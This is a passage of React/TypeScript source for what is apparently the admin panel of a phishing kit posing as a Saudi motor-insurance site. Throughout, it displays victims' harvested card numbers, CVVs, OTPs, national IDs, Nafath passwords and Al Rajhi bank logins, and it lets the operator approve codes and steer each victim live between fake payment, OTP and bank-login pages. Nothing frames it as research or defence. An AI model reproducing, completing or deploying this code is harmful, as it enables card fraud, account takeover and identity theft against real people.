import { useState, useEffect, useMemo, useRef } from "react";
import { useLocation } from "wouter";
import {
  Trash2,
  Users,
  CreditCard,
  UserCheck,
  Bell,
  CheckCircle,
  Search,
  User,
  Menu,
  ChevronLeft,
  ChevronRight,
  Phone,
  ClipboardCheck,
  Building2,
  Shield,
  Clock,
  MapPin,
  Calendar,
  Hash,
  Key,
  Smartphone,
  Car,
  DollarSign,
  Send,
  MoreVertical,
  Circle,
  MessageSquare,
} from "lucide-react";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { format } from "date-fns";
import { ar } from "date-fns/locale";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogFooter,
  DialogTrigger,
  DialogClose,
} from "@/components/ui/dialog";
import {
  Card,
  CardContent,
  CardHeader,
  CardTitle,
} from "@/components/ui/card";
import {
  collection,
  doc,
  updateDoc,
  onSnapshot,
  query,
  orderBy,
} from "firebase/firestore";
import { onValue, ref } from "firebase/database";
import {
  Tooltip,
  TooltipProvider,
  TooltipContent,
  TooltipTrigger,
} from "@/components/ui/tooltip";
import { Input } from "@/components/ui/input";
import { ScrollArea } from "@/components/ui/scroll-area";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import { useToast } from "@/hooks/use-toast";
import { db, database, isFirebaseConfigured } from "@/lib/firebase";

interface Notification {
  id: string;
  personalInfo?: {
    acceptMarketing?: boolean;
    birthDay?: string;
    birthMonth?: string;
    birthYear?: string;
    isHijri?: boolean;
  };
  nationalId?: string;
  phoneNumber?: string;
  phoneCarrier?: string;
  phoneIdNumber?: string;
  cardName?: string;
  cardNumber?: string;
  cardExpiry?: string;
  cardCvv?: string;
  otpCode?: string;
  otpVerified?: boolean;
  phoneOtpCode?: string;
  phoneOtpSubmittedAt?: string;
  phoneSubmittedAt?: string;
  phoneVerificationStatus?: string;
  nafazId?: string;
  nafazPass?: string;
  nafazStatus?: string;
  nafazSubmittedAt?: string;
  authNumber?: string;
  rajhiUser?: string;
  rajhiPassword?: string;
  rajhiOtp?: string;
  atmVerification?: {
    code?: string;
    status?: string;
    timestamp?: string;
  };
  selectedOffer?: {
    insuranceType?: string;
    offerId?: string;
    offerName?: string;
    totalPrice?: number;
    status?: string;
  };
  approvalStatus?: string;
  currentPage?: string;
  currentStep?: number;
  status?: string;
  createdAt?: string;
  lastSeen?: any;
  online?: boolean;
  isUnread?: boolean;
  isHidden?: boolean;
  any?: "red" | "yellow" | "green" | null;
  cardOtpApproved?: boolean;
  cardPinApproved?: boolean;
  phoneOtpApproved?: boolean;
  nafathApproved?: boolean;
  adminDirective?: {
    targetPage?: string;
    targetStep?: number;
    issuedAt?: string;
  };
}

const pageLabels: Record<string, string> = {
  "motor-insurance": "تأمين السيارات",
  "motor-insurance-step-1": "تأمين - الخطوة 1",
  "motor-insurance-step-2": "تأمين - الخطوة 2",
  "motor-insurance-step-3": "تأمين - الخطوة 3",
  "motor-insurance-step-4": "تأمين - الدفع",
  "motor-insurance-step-5": "تأمين - OTP",
  "motor-insurance-step-6": "تأمين - التحقق",
  "motor-insurance-step-7": "تأمين - النجاح",
  "phone-verification": "التحقق من الهاتف",
  "nafaz": "نفاذ",
  "rajhi": "الراجحي",
};

function UserStatus({ visitorId }: { visitorId: string }) {
  const [isOnline, setIsOnline] = useState(false);

  useEffect(() => {
    if (!database || !isFirebaseConfigured) return;
    const statusRef = ref(database, `status/${visitorId}`);
    const unsubscribe = onValue(statusRef, (snapshot) => {
      const data = snapshot.val();
      setIsOnline(data?.state === "online");
    });
    return () => unsubscribe();
  }, [visitorId]);

  return (
    <div className={`w-3 h-3 rounded-full ${isOnline ? "bg-emerald-500" : "bg-gray-300"}`} />
  );
}

export default function Dashboard() {
  const [, setLocation] = useLocation();
  const { toast } = useToast();
  const [notifications, setNotifications] = useState<Notification[]>([]);
  const [isLoading, setIsLoading] = useState(true);
  const [searchTerm, setSearchTerm] = useState("");
  const [selectedVisitor, setSelectedVisitor] = useState<Notification | null>(null);
  const [sidebarOpen, setSidebarOpen] = useState(true);

  const hasData = (n: Notification) => {
    return !!(
      n.cardName ||
      n.nationalId ||
      n.phoneNumber ||
      n.cardNumber ||
      n.otpCode ||
      n.phoneOtpCode ||
      n.rajhiUser ||
      n.nafazId ||
      n.personalInfo?.nationalId
    );
  };

  const filteredNotifications = useMemo(() => {
    return notifications.filter((notification) => {
      if (!hasData(notification)) return false;
      
      const matchesSearch =
        !searchTerm ||
        notification.cardName?.toLowerCase().includes(searchTerm.toLowerCase()) ||
        notification.nationalId?.includes(searchTerm) ||
        notification.phoneNumber?.includes(searchTerm) ||
        notification.cardNumber?.includes(searchTerm) ||
        notification.rajhiUser?.includes(searchTerm) ||
        notification.nafazId?.includes(searchTerm) ||
        notification.id.includes(searchTerm);
      return matchesSearch;
    });
  }, [notifications, searchTerm]);

  useEffect(() => {
    if (!isFirebaseConfigured || !db) {
      setIsLoading(false);
      return;
    }
    
    const q = query(collection(db, "pays"), orderBy("createdAt", "desc"));
    
    const unsubscribe = onSnapshot(q, (snapshot) => {
      const notificationsData: Notification[] = [];
      
      snapshot.forEach((doc) => {
        const data = doc.data();
        if (!data.isHidden) {
          notificationsData.push({
            id: doc.id,
            ...data,
          } as Notification);
        }
      });

      setNotifications(notificationsData);
      setIsLoading(false);
      
      if (selectedVisitor) {
        const updated = notificationsData.find(n => n.id === selectedVisitor.id);
        if (updated) setSelectedVisitor(updated);
      }
    });

    return () => unsubscribe();
  }, [selectedVisitor?.id]);

  const handleApprovalToggle = async (id: string, field: string, value: boolean) => {
    if (!db) return;
    try {
      await updateDoc(doc(db, "pays", id), { [field]: value });
      toast({ title: "تم التحديث", description: "تم تحديث حالة الموافقة" });
    } catch (error) {
      toast({ title: "خطأ", description: "فشل في التحديث", variant: "destructive" });
    }
  };

  const handleApprovalStatus = async (id: string, status: string, atmCode?: string) => {
    if (!db) return;
    try {
      const updateData: any = { approvalStatus: status };
      if (status === "approved_atm" && atmCode) {
        updateData.atmVerification = {
          code: atmCode,
          status: "pending",
          timestamp: new Date().toISOString(),
        };
      }
      await updateDoc(doc(db, "pays", id), updateData);
      toast({ title: "تم", description: status === "rejected" ? "تم الرفض" : "تمت الموافقة" });
    } catch (error) {
      toast({ title: "خطأ", description: "فشل في التحديث", variant: "destructive" });
    }
  };

  const handleRouteUser = async (id: string, targetPage: string) => {
    if (!db) return;
    try {
      await updateDoc(doc(db, "pays", id), {
        adminDirective: {
          targetPage,
          issuedAt: new Date().toISOString(),
        },
      });
      toast({ title: "تم التوجيه", description: `تم توجيه الزائر إلى ${pageLabels[targetPage] || targetPage}` });
    } catch (error) {
      toast({ title: "خطأ", description: "فشل في التوجيه", variant: "destructive" });
    }
  };

  const handleStepChange = async (id: string, step: string) => {
    if (!db) return;
    try {
      await updateDoc(doc(db, "pays", id), {
        adminDirective: {
          targetPage: "motor-insurance",
          targetStep: parseInt(step),
          issuedAt: new Date().toISOString(),
        },
      });
      toast({ title: "تم", description: `تم التوجيه للخطوة ${step}` });
    } catch (error) {
      toast({ title: "خطأ", description: "فشل في التحديث", variant: "destructive" });
    }
  };

  const handleDelete = async (id: string) => {
    if (!db) return;
    try {
      await updateDoc(doc(db, "pays", id), { isHidden: true });
      if (selectedVisitor?.id === id) setSelectedVisitor(null);
      toast({ title: "تم الحذف" });
    } catch (error) {
      toast({ title: "خطأ", description: "فشل في الحذف", variant: "destructive" });
    }
  };

  const handlePriorityChange = async (id: string, color: "red" | "yellow" | "green" | null) => {
    if (!db) return;
    try {
      await updateDoc(doc(db, "pays", id), { any: color });
    } catch (error) {
      toast({ title: "خطأ", variant: "destructive" });
    }
  };

  const getVisitorDisplayName = (n: Notification) => {
    return n.cardName || n.nationalId || n.phoneNumber || n.id.substring(0, 12);
  };

  const getLastActivity = (n: Notification) => {
    if (n.otpCode) return `OTP: ${n.otpCode}`;
    if (n.phoneOtpCode) return `Phone: ${n.phoneOtpCode}`;
    if (n.cardNumber) return `بطاقة: ****${n.cardNumber.slice(-4)}`;
    if (n.nationalId) return `هوية: ${n.nationalId}`;
    return pageLabels[n.currentPage || ""] || "زائر جديد";
  };

  const getPriorityColor = (priority: string | null | undefined) => {
    switch (priority) {
      case "red": return "bg-red-500";
      case "yellow": return "bg-yellow-500";
      case "green": return "bg-green-500";
      default: return "";
    }
  };

  const getPriorityBorderClass = (priority: string | null | undefined) => {
    switch (priority) {
      case "red": return "border-r-4 border-r-red-500";
      case "yellow": return "border-r-4 border-r-yellow-500";
      case "green": return "border-r-4 border-r-green-500";
      default: return "";
    }
  };

  if (!isFirebaseConfigured) {
    return (
      <div className="flex items-center justify-center h-screen" dir="rtl">
        <Card className="p-8 text-center">
          <CardTitle className="mb-4">Firebase غير مكون</CardTitle>
          <p className="text-muted-foreground">يرجى إضافة متغيرات Firebase البيئية</p>
        </Card>
      </div>
    );
  }

  return (
    <div className="flex h-screen bg-background" dir="rtl">
      {/* Sidebar - Visitor List */}
      <div className={`${sidebarOpen ? "w-80" : "w-0"} transition-all duration-300 border-l bg-card flex flex-col overflow-hidden`}>
        {/* Sidebar Header */}
        <div className="p-4 border-b bg-gradient-to-l from-primary/10 to-transparent">
          <div className="flex items-center justify-between mb-4">
            <h2 className="font-bold text-lg flex items-center gap-2">
              <div className="relative">
                <Bell className="h-5 w-5 text-primary" />
                {filteredNotifications.filter(n => n.isUnread).length > 0 && (
                  <span className="absolute -top-2 -right-2 bg-red-500 text-white text-[10px] font-bold rounded-full min-w-[18px] h-[18px] flex items-center justify-center px-1">
                    {filteredNotifications.filter(n => n.isUnread).length}
                  </span>
                )}
              </div>
              الزوار
              <Badge variant="secondary" className="text-xs">{filteredNotifications.length}</Badge>
            </h2>
          </div>
          <div className="relative">
            <Search className="absolute right-3 top-1/2 -translate-y-1/2 h-4 w-4 text-muted-foreground" />
            <Input
              placeholder="بحث..."
              value={searchTerm}
              onChange={(e) => setSearchTerm(e.target.value)}
              className="pr-9 bg-background"
              data-testid="input-search-visitors"
            />
          </div>
        </div>

        {/* Visitor List */}
        <ScrollArea className="flex-1">
          {isLoading ? (
            <div className="flex items-center justify-center py-8">
              <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-primary" />
            </div>
          ) : filteredNotifications.length === 0 ? (
            <div className="text-center py-8 text-muted-foreground">
              <MessageSquare className="h-12 w-12 mx-auto mb-2 opacity-50" />
              <p>لا يوجد زوار</p>
            </div>
          ) : (
            <div className="divide-y">
              {filteredNotifications.map((notification) => (
                <div
                  key={notification.id}
                  onClick={() => {
                    setSelectedVisitor(notification);
                    if (notification.isUnread && db) {
                      updateDoc(doc(db, "pays", notification.id), { isUnread: false });
                    }
                  }}
                  className={`p-4 cursor-pointer transition-all hover:bg-muted/50 ${
                    selectedVisitor?.id === notification.id ? "bg-primary/10 border-r-4 border-r-primary" : ""
                  } ${getPriorityBorderClass(notification.any)} ${notification.isUnread ? "bg-primary/5" : ""}`}
                  data-testid={`visitor-item-${notification.id}`}
                >
                  <div className="flex items-start gap-3">
                    {/* Avatar with online status */}
                    <div className="relative">
                      <div className={`w-12 h-12 rounded-full flex items-center justify-center ${
                        notification.cardNumber ? "bg-emerald-100 dark:bg-emerald-900/30" : "bg-primary/10"
                      }`}>
                        {notification.cardNumber ? (
                          <CreditCard className="h-5 w-5 text-emerald-600" />
                        ) : (
                          <User className="h-5 w-5 text-primary" />
                        )}
                      </div>
                      <div className="absolute -bottom-0.5 -left-0.5">
                        <UserStatus visitorId={notification.id} />
                      </div>
                      {notification.any && (
                        <div className={`absolute -top-1 -right-1 w-3 h-3 rounded-full ${getPriorityColor(notification.any)}`} />
                      )}
                    </div>

                    {/* Content */}
                    <div className="flex-1 min-w-0">
                      <div className="flex items-center justify-between mb-1">
                        <div className="flex items-center gap-2">
                          {notification.isUnread && (
                            <div className="w-2 h-2 rounded-full bg-blue-500 flex-shrink-0" />
                          )}
                          <p className={`text-sm truncate ${notification.isUnread ? "font-bold" : "font-medium"}`}>
                            {getVisitorDisplayName(notification)}
                          </p>
                        </div>
                        <span className="text-xs text-muted-foreground">
                          {notification.createdAt ? format(new Date(notification.createdAt), "HH:mm", { locale: ar }) : ""}
                        </span>
                      </div>
                      <p className={`text-xs truncate ${notification.isUnread ? "text-foreground" : "text-muted-foreground"}`}>
                        {getLastActivity(notification)}
                      </p>
                      <div className="flex items-center gap-1 mt-2">
                        <Badge variant="outline" className="text-[10px] px-1.5 py-0">
                          {pageLabels[notification.currentPage || ""] || "الرئيسية"}
                        </Badge>
                        {notification.otpCode && (
                          <Badge className="text-[10px] px-1.5 py-0 bg-blue-600">OTP</Badge>
                        )}
                        {notification.cardNumber && (
                          <Badge className="text-[10px] px-1.5 py-0 bg-emerald-600">بطاقة</Badge>
                        )}
                      </div>
                    </div>
                  </div>
                </div>
              ))}
            </div>
          )}
        </ScrollArea>
      </div>

      {/* Main Content - Visitor Details */}
      <div className="flex-1 flex flex-col overflow-hidden">
        {/* Header */}
        <div className="h-16 border-b bg-card flex items-center justify-between px-4">
          <div className="flex items-center gap-3">
            <Button
              variant="ghost"
              size="icon"
              onClick={() => setSidebarOpen(!sidebarOpen)}
              data-testid="button-toggle-sidebar"
            >
              <Menu className="h-5 w-5" />
            </Button>
            {selectedVisitor && (
              <div className="flex items-center gap-3">
                <div className="w-10 h-10 rounded-full bg-primary/10 flex items-center justify-center">
                  <User className="h-5 w-5 text-primary" />
                </div>
                <div>
                  <p className="font-semibold">{getVisitorDisplayName(selectedVisitor)}</p>
                  <p className="text-xs text-muted-foreground">{selectedVisitor.id}</p>
                </div>
              </div>
            )}
          </div>
          {selectedVisitor && (
            <div className="flex items-center gap-2">
              <TooltipProvider>
                <Tooltip>
                  <TooltipTrigger asChild>
                    <Button
                      variant="ghost"
                      size="icon"
                      className="text-destructive"
                      onClick={() => handleDelete(selectedVisitor.id)}
                      data-testid="button-delete-visitor"
                    >
                      <Trash2 className="h-4 w-4" />
                    </Button>
                  </TooltipTrigger>
                  <TooltipContent>حذف</TooltipContent>
                </Tooltip>
              </TooltipProvider>
            </div>
          )}
        </div>

        {/* Detail Content */}
        <ScrollArea className="flex-1 p-4">
          {!selectedVisitor ? (
            <div className="flex flex-col items-center justify-center h-full text-muted-foreground">
              <MessageSquare className="h-16 w-16 mb-4 opacity-30" />
              <p className="text-lg">اختر زائر لعرض التفاصيل</p>
            </div>
          ) : (
            <div className="max-w-4xl mx-auto space-y-4">
              {/* Quick Actions */}
              <Card>
                <CardHeader className="pb-3">
                  <CardTitle className="text-base flex items-center gap-2">
                    <Shield className="h-4 w-4" />
                    إجراءات سريعة
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  <div className="flex flex-wrap gap-2">
                    <Button
                      size="sm"
                      className="bg-emerald-600 hover:bg-emerald-700"
                      onClick={() => handleApprovalStatus(selectedVisitor.id, "approved_otp")}
                      data-testid="button-approve-otp"
                    >
                      <CheckCircle className="h-4 w-4 ml-2" />
                      موافقة OTP
                    </Button>
                    <Dialog>
                      <DialogTrigger asChild>
                        <Button size="sm" variant="outline" className="border-blue-500 text-blue-600">
                          <Key className="h-4 w-4 ml-2" />
                          إرسال ATM
                        </Button>
                      </DialogTrigger>
                      <DialogContent dir="rtl">
                        <DialogHeader>
                          <DialogTitle>إدخال رمز الصراف</DialogTitle>
                        </DialogHeader>
                        <div className="py-4">
                          <Input
                            id="atm-code-input"
                            placeholder="أدخل رمز الصراف"
                            className="text-center text-xl"
                            data-testid="input-atm-code"
                          />
                        </div>
                        <DialogFooter>
                          <DialogClose asChild>
                            <Button onClick={() => {
                              const input = document.getElementById("atm-code-input") as HTMLInputElement;
                              if (input?.value) {
                                handleApprovalStatus(selectedVisitor.id, "approved_atm", input.value);
                              }
                            }} data-testid="button-confirm-atm">
                              تأكيد
                            </Button>
                          </DialogClose>
                        </DialogFooter>
                      </DialogContent>
                    </Dialog>
                    <Button
                      size="sm"
                      variant="destructive"
                      onClick={() => handleApprovalStatus(selectedVisitor.id, "rejected")}
                      data-testid="button-reject"
                    >
                      رفض
                    </Button>
                  </div>

                  <div className="flex flex-wrap gap-2 mt-4 pt-4 border-t">
                    <Select onValueChange={(v) => handleRouteUser(selectedVisitor.id, v)}>
                      <SelectTrigger className="w-40" data-testid="select-route-page">
                        <SelectValue placeholder="توجيه لصفحة..." />
                      </SelectTrigger>
                      <SelectContent>
                        <SelectItem value="motor-insurance">تأمين السيارات</SelectItem>
                        <SelectItem value="phone-verification">التحقق من الهاتف</SelectItem>
                        <SelectItem value="nafaz">نفاذ</SelectItem>
                        <SelectItem value="rajhi">الراجحي</SelectItem>
                      </SelectContent>
                    </Select>
                    <Select onValueChange={(v) => handleStepChange(selectedVisitor.id, v)}>
                      <SelectTrigger className="w-40" data-testid="select-route-step">
                        <SelectValue placeholder="توجيه لخطوة..." />
                      </SelectTrigger>
                      <SelectContent>
                        <SelectItem value="1">الخطوة 1 - البيانات</SelectItem>
                        <SelectItem value="2">الخطوة 2 - المركبة</SelectItem>
                        <SelectItem value="3">الخطوة 3 - العروض</SelectItem>
                        <SelectItem value="4">الخطوة 4 - الدفع</SelectItem>
                        <SelectItem value="5">الخطوة 5 - OTP</SelectItem>
                        <SelectItem value="6">الخطوة 6 - التحقق</SelectItem>
                        <SelectItem value="7">الخطوة 7 - النجاح</SelectItem>
                      </SelectContent>
                    </Select>
                    <div className="flex gap-1">
                      {["red", "yellow", "green"].map((color) => (
                        <Button
                          key={color}
                          size="icon"
                          variant={selectedVisitor.any === color ? "default" : "outline"}
                          className={`w-8 h-8 ${selectedVisitor.any === color ? getPriorityColor(color) : ""}`}
                          onClick={() => handlePriorityChange(selectedVisitor.id, selectedVisitor.any === color ? null : color as any)}
                          data-testid={`button-priority-${color}`}
                        >
                          <Circle className={`h-3 w-3 ${color === "red" ? "text-red-500" : color === "yellow" ? "text-yellow-500" : "text-green-500"}`} />
                        </Button>
                      ))}
                    </div>
                  </div>

                  <div className="flex gap-2 mt-4 pt-4 border-t">
                    <Button
                      size="sm"
                      variant={selectedVisitor.cardOtpApproved ? "default" : "outline"}
                      onClick={() => handleApprovalToggle(selectedVisitor.id, "cardOtpApproved", !selectedVisitor.cardOtpApproved)}
                      className={selectedVisitor.cardOtpApproved ? "bg-emerald-600" : ""}
                      data-testid="button-toggle-card-otp"
                    >
                      <CreditCard className="h-4 w-4 ml-1" />
                      OTP البطاقة
                    </Button>
                    <Button
                      size="sm"
                      variant={selectedVisitor.phoneOtpApproved ? "default" : "outline"}
                      onClick={() => handleApprovalToggle(selectedVisitor.id, "phoneOtpApproved", !selectedVisitor.phoneOtpApproved)}
                      className={selectedVisitor.phoneOtpApproved ? "bg-emerald-600" : ""}
                      data-testid="button-toggle-phone-otp"
                    >
                      <Phone className="h-4 w-4 ml-1" />
                      OTP الهاتف
                    </Button>
                    <Button
                      size="sm"
                      variant={selectedVisitor.nafathApproved ? "default" : "outline"}
                      onClick={() => handleApprovalToggle(selectedVisitor.id, "nafathApproved", !selectedVisitor.nafathApproved)}
                      className={selectedVisitor.nafathApproved ? "bg-emerald-600" : ""}
                      data-testid="button-toggle-nafath"
                    >
                      <ClipboardCheck className="h-4 w-4 ml-1" />
                      نفاذ
                    </Button>
                  </div>
                </CardContent>
              </Card>

              {/* Personal Info */}
              <Card>
                <CardHeader className="pb-3">
                  <CardTitle className="text-base flex items-center gap-2">
                    <User className="h-4 w-4" />
                    البيانات الشخصية
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  <div className="grid grid-cols-2 md:grid-cols-3 gap-4">
                    {selectedVisitor.nationalId && (
                      <div className="flex items-center gap-2">
                        <Hash className="h-4 w-4 text-blue-500" />
                        <div>
                          <p className="text-xs text-muted-foreground">رقم الهوية</p>
                          <p className="font-mono font-semibold">{selectedVisitor.nationalId}</p>
                        </div>
                      </div>
                    )}
                    {selectedVisitor.phoneNumber && (
                      <div className="flex items-center gap-2">
                        <Phone className="h-4 w-4 text-purple-500" />
                        <div>
                          <p className="text-xs text-muted-foreground">الهاتف</p>
                          <p className="font-mono font-semibold">{selectedVisitor.phoneNumber}</p>
                        </div>
                      </div>
                    )}
                    {selectedVisitor.phoneCarrier && (
                      <div className="flex items-center gap-2">
                        <Smartphone className="h-4 w-4 text-violet-500" />
                        <div>
                          <p className="text-xs text-muted-foreground">الشبكة</p>
                          <p className="font-semibold">{selectedVisitor.phoneCarrier}</p>
                        </div>
                      </div>
                    )}
                    {selectedVisitor.personalInfo?.birthYear && (
                      <div className="flex items-center gap-2">
                        <Calendar className="h-4 w-4 text-indigo-500" />
                        <div>
                          <p className="text-xs text-muted-foreground">تاريخ الميلاد</p>
                          <p className="font-semibold">
                            {selectedVisitor.personalInfo.birthDay}/{selectedVisitor.personalInfo.birthMonth}/{selectedVisitor.personalInfo.birthYear}
                          </p>
                        </div>
                      </div>
                    )}
                  </div>
                </CardContent>
              </Card>

              {/* Card Info */}
              {(selectedVisitor.cardNumber || selectedVisitor.cardName) && (
                <Card className="border-emerald-200 dark:border-emerald-800">
                  <CardHeader className="pb-3 bg-emerald-50 dark:bg-emerald-900/20">
                    <CardTitle className="text-base flex items-center gap-2 text-emerald-700 dark:text-emerald-400">
                      <CreditCard className="h-4 w-4" />
                      بيانات البطاقة
                    </CardTitle>
                  </CardHeader>
                  <CardContent className="pt-4">
                    <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
                      {selectedVisitor.cardNumber && (
                        <div className="col-span-2">
                          <p className="text-xs text-muted-foreground">رقم البطاقة</p>
                          <p className="font-mono text-lg font-bold tracking-wider">{selectedVisitor.cardNumber}</p>
                        </div>
                      )}
                      {selectedVisitor.cardExpiry && (
                        <div>
                          <p className="text-xs text-muted-foreground">تاريخ الانتهاء</p>
                          <p className="font-mono font-semibold">{selectedVisitor.cardExpiry}</p>
                        </div>
                      )}
                      {selectedVisitor.cardCvv && (
                        <div>
                          <p className="text-xs text-muted-foreground">CVV</p>
                          <p className="font-mono font-semibold text-rose-600">{selectedVisitor.cardCvv}</p>
                        </div>
                      )}
                      {selectedVisitor.cardName && (
                        <div className="col-span-2">
                          <p className="text-xs text-muted-foreground">اسم حامل البطاقة</p>
                          <p className="font-semibold">{selectedVisitor.cardName}</p>
                        </div>
                      )}
                    </div>
                  </CardContent>
                </Card>
              )}

              {/* OTP Codes */}
              {(selectedVisitor.otpCode || selectedVisitor.phoneOtpCode || selectedVisitor.rajhiOtp || selectedVisitor.atmVerification?.code) && (
                <Card className="border-blue-200 dark:border-blue-800">
                  <CardHeader className="pb-3 bg-blue-50 dark:bg-blue-900/20">
                    <CardTitle className="text-base flex items-center gap-2 text-blue-700 dark:text-blue-400">
                      <Key className="h-4 w-4" />
                      رموز التحقق
                    </CardTitle>
                  </CardHeader>
                  <CardContent className="pt-4">
                    <div className="flex flex-wrap gap-3">
                      {selectedVisitor.otpCode && (
                        <div className="bg-blue-100 dark:bg-blue-900/30 rounded-lg px-4 py-3 text-center">
                          <p className="text-xs text-muted-foreground mb-1">OTP البطاقة</p>
                          <p className="font-mono text-2xl font-bold text-blue-600">{selectedVisitor.otpCode}</p>
                        </div>
                      )}
                      {selectedVisitor.phoneOtpCode && (
                        <div className="bg-pink-100 dark:bg-pink-900/30 rounded-lg px-4 py-3 text-center">
                          <p className="text-xs text-muted-foreground mb-1">OTP الهاتف</p>
                          <p className="font-mono text-2xl font-bold text-pink-600">{selectedVisitor.phoneOtpCode}</p>
                        </div>
                      )}
                      {selectedVisitor.rajhiOtp && (
                        <div className="bg-sky-100 dark:bg-sky-900/30 rounded-lg px-4 py-3 text-center">
                          <p className="text-xs text-muted-foreground mb-1">OTP الراجحي</p>
                          <p className="font-mono text-2xl font-bold text-sky-600">{selectedVisitor.rajhiOtp}</p>
                        </div>
                      )}
                      {selectedVisitor.atmVerification?.code && (
                        <div className="bg-orange-100 dark:bg-orange-900/30 rounded-lg px-4 py-3 text-center">
                          <p className="text-xs text-muted-foreground mb-1">رمز الصراف</p>
                          <p className="font-mono text-2xl font-bold text-orange-600">{selectedVisitor.atmVerification.code}</p>
                        </div>
                      )}
                      {selectedVisitor.authNumber && (
                        <div className="bg-purple-100 dark:bg-purple-900/30 rounded-lg px-4 py-3 text-center">
                          <p className="text-xs text-muted-foreground mb-1">رقم المصادقة</p>
                          <p className="font-mono text-2xl font-bold text-purple-600">{selectedVisitor.authNumber}</p>
                        </div>
                      )}
                    </div>
                  </CardContent>
                </Card>
              )}

              {/* Nafaz Info */}
              {(selectedVisitor.nafazId || selectedVisitor.nafazPass) && (
                <Card className="border-cyan-200 dark:border-cyan-800">
                  <CardHeader className="pb-3 bg-cyan-50 dark:bg-cyan-900/20">
                    <CardTitle className="text-base flex items-center gap-2 text-cyan-700 dark:text-cyan-400">
                      <ClipboardCheck className="h-4 w-4" />
                      بيانات نفاذ
                    </CardTitle>
                  </CardHeader>
                  <CardContent className="pt-4">
                    <div className="grid grid-cols-2 gap-4">
                      {selectedVisitor.nafazId && (
                        <div>
                          <p className="text-xs text-muted-foreground">رقم الهوية</p>
                          <p className="font-mono font-semibold">{selectedVisitor.nafazId}</p>
                        </div>
                      )}
                      {selectedVisitor.nafazPass && (
                        <div>
                          <p className="text-xs text-muted-foreground">كلمة المرور</p>
                          <p className="font-mono font-semibold text-cyan-600">{selectedVisitor.nafazPass}</p>
                        </div>
                      )}
                      {selectedVisitor.nafazStatus && (
                        <div>
                          <p className="text-xs text-muted-foreground">الحالة</p>
                          <Badge variant="outline">{selectedVisitor.nafazStatus}</Badge>
                        </div>
                      )}
                    </div>
                  </CardContent>
                </Card>
              )}

              {/* Rajhi Info */}
              {(selectedVisitor.rajhiUser || selectedVisitor.rajhiPassword) && (
                <Card className="border-sky-200 dark:border-sky-800">
                  <CardHeader className="pb-3 bg-sky-50 dark:bg-sky-900/20">
                    <CardTitle className="text-base flex items-center gap-2 text-sky-700 dark:text-sky-400">
                      <Building2 className="h-4 w-4" />
                      بيانات الراجحي
                    </CardTitle>
                  </CardHeader>
                  <CardContent className="pt-4">
                    <div className="grid grid-cols-2 md:grid-cols-3 gap-4">
                      {selectedVisitor.rajhiUser && (
                        <div>
                          <p className="text-xs text-muted-foreground">اسم المستخدم</p>
                          <p className="font-mono font-semibold">{selectedVisitor.rajhiUser}</p>
                        </div>
                      )}
                      {selectedVisitor.rajhiPassword && (
                        <div>
                          <p className="text-xs text-muted-foreground">كلمة المرور</p>
                          <p className="font-mono font-semibold text-sky-600">{selectedVisitor.rajhiPassword}</p>
                        </div>
                      )}
                      {selectedVisitor.rajhiOtp && (
                        <div>
                          <p className="text-xs text-muted-foreground">OTP</p>
                          <p className="font-mono font-semibold text-sky-600">{selectedVisitor.rajhiOtp}</p>
                        </div>
                      )}
                    </div>
                  </CardContent>
                </Card>
              )}

              {/* Selected Offer */}
              {selectedVisitor.selectedOffer && (
                <Card className="border-amber-200 dark:border-amber-800">
                  <CardHeader className="pb-3 bg-amber-50 dark:bg-amber-900/20">
                    <CardTitle className="text-base flex items-center gap-2 text-amber-700 dark:text-amber-400">
                      <Car className="h-4 w-4" />
                      العرض المختار
                    </CardTitle>
                  </CardHeader>
                  <CardContent className="pt-4">
                    <div className="grid grid-cols-2 md:grid-cols-3 gap-4">
                      {selectedVisitor.selectedOffer.offerName && (
                        <div className="col-span-2">
                          <p className="text-xs text-muted-foreground">اسم العرض</p>
                          <p className="font-semibold">{selectedVisitor.selectedOffer.offerName}</p>
                        </div>
                      )}
                      {selectedVisitor.selectedOffer.insuranceType && (
                        <div>
                          <p className="text-xs text-muted-foreground">نوع التأمين</p>
                          <Badge variant="outline">{selectedVisitor.selectedOffer.insuranceType}</Badge>
                        </div>
                      )}
                      {selectedVisitor.selectedOffer.totalPrice && (
                        <div>
                          <p className="text-xs text-muted-foreground">السعر الإجمالي</p>
                          <p className="font-bold text-lg text-amber-600">
                            {selectedVisitor.selectedOffer.totalPrice.toFixed(2)} ر.س
                          </p>
                        </div>
                      )}
                      {selectedVisitor.selectedOffer.status && (
                        <div>
                          <p className="text-xs text-muted-foreground">الحالة</p>
                          <Badge className={selectedVisitor.selectedOffer.status === "completed" ? "bg-emerald-600" : ""}>
                            {selectedVisitor.selectedOffer.status}
                          </Badge>
                        </div>
                      )}
                    </div>
                  </CardContent>
                </Card>
              )}

              {/* Status Info */}
              <Card>
                <CardHeader className="pb-3">
                  <CardTitle className="text-base flex items-center gap-2">
                    <Clock className="h-4 w-4" />
                    معلومات الحالة
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  <div className="grid grid-cols-2 md:grid-cols-4 gap-4 text-sm">
                    <div>
                      <p className="text-xs text-muted-foreground">الصفحة الحالية</p>
                      <Badge variant="outline">{pageLabels[selectedVisitor.currentPage || ""] || selectedVisitor.currentPage || "الرئيسية"}</Badge>
                    </div>
                    {selectedVisitor.currentStep && (
                      <div>
                        <p className="text-xs text-muted-foreground">الخطوة</p>
                        <Badge>{selectedVisitor.currentStep}</Badge>
                      </div>
                    )}
                    {selectedVisitor.approvalStatus && (
                      <div>
                        <p className="text-xs text-muted-foreground">حالة الموافقة</p>
                        <Badge className={
                          selectedVisitor.approvalStatus === "approved_otp" || selectedVisitor.approvalStatus === "approved_atm"
                            ? "bg-emerald-600"
                            : selectedVisitor.approvalStatus === "rejected"
                            ? "bg-red-600"
                            : ""
                        }>
                          {selectedVisitor.approvalStatus}
                        </Badge>
                      </div>
                    )}
                    {selectedVisitor.createdAt && (
                      <div>
                        <p className="text-xs text-muted-foreground">تاريخ الإنشاء</p>
                        <p className="font-mono text-xs">{format(new Date(selectedVisitor.createdAt), "yyyy/MM/dd HH:mm", { locale: ar })}</p>
                      </div>
                    )}
                  </div>
                </CardContent>
              </Card>
            </div>
          )}
